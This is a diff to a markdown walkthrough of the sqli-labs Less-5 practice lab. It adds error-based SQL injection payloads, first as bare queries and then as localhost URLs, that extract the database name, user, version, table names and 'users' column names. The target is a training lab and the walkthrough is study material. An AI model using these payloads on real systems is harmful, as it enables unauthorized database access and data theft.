@@ -98,3 +98,59 @@ select count(*), concat(0x3a, 0x3a, (select table_name from information_schema.t
 ![](images/5/21.png)
 
 ![](images/5/22.png)
+
+```mysql
+(select count(*), concat(0x3a, 0x3a, (select database()), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)
+```
+
+```mysql
+select 1 from (select count(*), concat(0x3a, 0x3a, (select database()), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)
+```
+
+```mysql
+(select 1 from (select count(*), concat(0x3a, 0x3a, (select database()), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)
+```
+
+```
+http://localhost/sqli-labs/Less-5/?id=3' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select database()), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+http://localhost/sqli-labs/Less-5/?id=3' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select current_user), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+http://localhost/sqli-labs/Less-5/?id=3' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select version()), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema=database() limit 0,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema=database() limit 2,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema=database() limit 3,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+```
+
+![](images/5/23.png)
+
+![](images/5/24.png)
+
+![](images/5/25.png)
+
+![](images/5/26.png)
+
+![](images/5/27.png)
+
+![](images/5/28.png)
+
+![](images/5/29.png)
+
+```
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select column_name from information_schema.columns where table_name='users' limit 0,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+```
+
+![](images/5/30.png)
+
+![](images/5/31.png)
+
+```
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select column_name from information_schema.columns where table_name='users' limit 1,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+```
+
+```
+http://localhost/sqli-labs/Less-5/?id=1' AND (select 1 from (select count(*), concat(0x3a, 0x3a, (select column_name from information_schema.columns where table_name='users' limit 2,1), 0x3a, 0x3a, floor(rand()*2))a from information_schema.columns group by a)b)--+
+```
+
+![](images/5/32.png)
+
+![](images/5/33.png)
